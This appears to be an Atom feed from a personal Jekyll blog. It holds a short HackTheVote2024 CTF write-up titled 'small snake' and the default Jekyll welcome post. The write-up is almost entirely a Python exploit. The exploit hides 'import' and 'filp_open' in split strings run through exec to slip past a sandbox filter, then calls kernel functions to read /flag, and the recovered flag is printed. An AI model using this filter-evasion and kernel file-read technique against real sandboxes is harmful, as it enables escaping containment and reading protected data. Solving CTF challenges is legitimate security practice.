<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-05T15:51:40+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">HSw109</title><subtitle>just me hsw109</subtitle><entry><title type="html">small snake WU</title><link href="http://localhost:4000/write-up/hackthevote2024/2024/11/05/small-snake.html" rel="alternate" type="text/html" title="small snake WU" /><published>2024-11-05T15:23:10+07:00</published><updated>2024-11-05T15:23:10+07:00</updated><id>http://localhost:4000/write-up/hackthevote2024/2024/11/05/small-snake</id><content type="html" xml:base="http://localhost:4000/write-up/hackthevote2024/2024/11/05/small-snake.html"><![CDATA[<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">var4</span> <span class="o">=</span> <span class="s">'i'</span><span class="o">+</span><span class="s">'m'</span><span class="o">+</span><span class="s">'p'</span><span class="o">+</span><span class="s">'o'</span><span class="o">+</span><span class="s">'r'</span><span class="o">+</span><span class="s">'t'</span><span class="o">+</span> <span class="s">' kernel_ffi'</span>
    <span class="k">exec</span><span class="p">(</span><span class="n">var4</span><span class="p">)</span>
    <span class="n">func</span> <span class="o">=</span> <span class="s">"filp_o"</span><span class="o">+</span><span class="s">"pen"</span>
    <span class="n">ffi</span> <span class="o">=</span> <span class="n">kernel_ffi</span><span class="p">.</span><span class="n">symbol</span><span class="p">(</span><span class="n">func</span><span class="p">)</span>
    <span class="n">file_path</span> <span class="o">=</span> <span class="s">"/flag"</span><span class="p">;</span> <span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">var2</span> <span class="o">=</span> <span class="s">"file = filp_o"</span><span class="o">+</span><span class="s">"pen(file_path, flags, mode)"</span>
    <span class="k">exec</span><span class="p">(</span><span class="n">var2</span><span class="p">)</span>
    <span class="nb">buffer</span> <span class="o">=</span> <span class="n">kernel_ffi</span><span class="p">.</span><span class="n">kmalloc</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
    <span class="n">kernel_read</span> <span class="o">=</span> <span class="n">kernel_ffi</span><span class="p">.</span><span class="n">symbol</span><span class="p">(</span><span class="s">"kernel_read"</span><span class="p">)</span>
    <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">kernel_read</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="nb">buffer</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">pos</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">kernel_ffi</span><span class="p">.</span><span class="nb">str</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div>

<p>flag{its_like_rust_in_the_kernel_but_better}</p>]]></content><author><name>HSw109</name></author><category term="write-up" /><category term="HackTheVote2024" /><category term="sandbox" /><summary type="html"><![CDATA[var4 = 'i'+'m'+'p'+'o'+'r'+'t'+ ' kernel_ffi' exec(var4) func = "filp_o"+"pen" ffi = kernel_ffi.symbol(func) file_path = "/flag"; flags = 0; mode = 0 var2 = "file = filp_o"+"pen(file_path, flags, mode)" exec(var2) buffer = kernel_ffi.kmalloc(4096) kernel_read = kernel_ffi.symbol("kernel_read") pos = 0 bytes_read = kernel_read(file, buffer, 4096, pos) data = kernel_ffi.str(buffer) print(data)]]></summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/jekyll/update/2024/11/05/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2024-11-05T13:23:10+07:00</published><updated>2024-11-05T13:23:10+07:00</updated><id>http://localhost:4000/jekyll/update/2024/11/05/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2024/11/05/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>

<p>Jekyll requires blog post files to be named according to the following format:</p>

<p><code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-title.MARKUP</code></p>

<p>Where <code class="language-plaintext highlighter-rouge">YEAR</code> is a four-digit number, <code class="language-plaintext highlighter-rouge">MONTH</code> and <code class="language-plaintext highlighter-rouge">DAY</code> are both two-digit numbers, and <code class="language-plaintext highlighter-rouge">MARKUP</code> is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>

<p>Jekyll also offers powerful support for code snippets:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>

<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry></feed>